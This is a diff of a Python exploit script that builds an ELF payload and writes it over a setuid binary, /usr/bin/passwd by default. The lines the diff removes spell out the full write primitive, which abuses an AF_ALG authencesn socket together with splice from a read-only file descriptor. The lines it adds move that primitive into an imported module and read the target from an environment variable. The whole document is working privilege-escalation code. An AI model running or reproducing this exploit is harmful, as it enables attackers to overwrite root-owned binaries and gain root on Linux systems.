@@ -1,10 +1,9 @@
 #!/usr/bin/env python3
-import os
-import socket
 import struct
+import os
 import sys
 
-LEVEL = 279
+from copyfail_primitive import copy_fail_path
 
 
 def payload():
@@ -38,28 +37,7 @@ def payload():
     struct.pack_into("<IIQQQQQQ", ph, 0, 1, 5, 0, 0x400000, 0x400000, size, size, 0x1000)
     return bytes(eh + ph + code)
 
-
-def write4(fd, offset, chunk):
-    a = socket.socket(38, 5, 0)
-    a.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
-    a.setsockopt(LEVEL, 1, bytes.fromhex("0800010000000010" + "0" * 64))
-    a.setsockopt(LEVEL, 5, None, 4)
-    u, _ = a.accept()
-    z = b"\0"
-    o = offset + 4
-    u.sendmsg([b"A" * 4 + chunk], [(LEVEL, 3, z * 4), (LEVEL, 2, b"\x10" + z * 19), (LEVEL, 4, b"\x08" + z * 3)], 32768)
-    r, w = os.pipe()
-    os.splice(fd, w, o, offset_src=0)
-    os.splice(r, u.fileno(), o)
-    try:
-        u.recv(8 + offset)
-    except Exception:
-        pass
-
-
-target = sys.argv[1] if len(sys.argv) > 1 else "/usr/bin/passwd"
+target = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("DCF_SUIDBIN", "/usr/bin/passwd")
 data = payload()
-fd = os.open(target, os.O_RDONLY)
-for i in range(0, len(data), 4):
-    write4(fd, i, data[i : i + 4].ljust(4, b"\0"))
+copy_fail_path(target, data)
 print(f"patched {target} with bash payload {len(data)} bytes")
